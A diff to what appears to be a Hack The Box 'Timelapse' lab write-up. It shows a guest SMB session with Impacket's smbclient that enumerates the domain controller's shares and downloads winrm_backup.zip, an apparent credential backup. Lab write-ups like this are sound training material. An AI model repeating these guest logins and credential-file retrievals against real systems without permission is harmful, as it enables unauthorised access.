@@ -156,4 +156,41 @@ SMB         10.129.227.113  445    DC01             SYSVOL                      
 ```
 I have read access on `Shares`
 
+# `Shares` share
 
+```python
+# smbclient.py timelapse.htb/'Guest':''@dc01.timelapse.htb   
+Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+Shares
+SYSVOL
+# use Shares
+# ls
+drw-rw-rw-          0  Mon Oct 25 16:55:14 2021 .
+drw-rw-rw-          0  Mon Oct 25 16:55:14 2021 ..
+drw-rw-rw-          0  Mon Oct 25 20:40:06 2021 Dev
+drw-rw-rw-          0  Mon Oct 25 16:55:14 2021 HelpDesk
+# ls Dev
+drw-rw-rw-          0  Mon Oct 25 20:40:06 2021 Dev
+# cd Dev
+# ls
+drw-rw-rw-          0  Mon Oct 25 20:40:06 2021 .
+drw-rw-rw-          0  Mon Oct 25 20:40:06 2021 ..
+-rw-rw-rw-       2611  Mon Oct 25 22:05:30 2021 winrm_backup.zip
+# get winrm_backup.zip
+# cd ../HelpDesk
+# ls
+drw-rw-rw-          0  Mon Oct 25 16:55:14 2021 .
+drw-rw-rw-          0  Mon Oct 25 16:55:14 2021 ..
+-rw-rw-rw-    1118208  Mon Oct 25 16:55:14 2021 LAPS.x64.msi
+-rw-rw-rw-     104422  Mon Oct 25 16:55:14 2021 LAPS_Datasheet.docx
+-rw-rw-rw-     641378  Mon Oct 25 16:55:14 2021 LAPS_OperationsGuide.docx
+-rw-rw-rw-      72683  Mon Oct 25 16:55:14 2021 LAPS_TechnicalSpecification.docx
+```
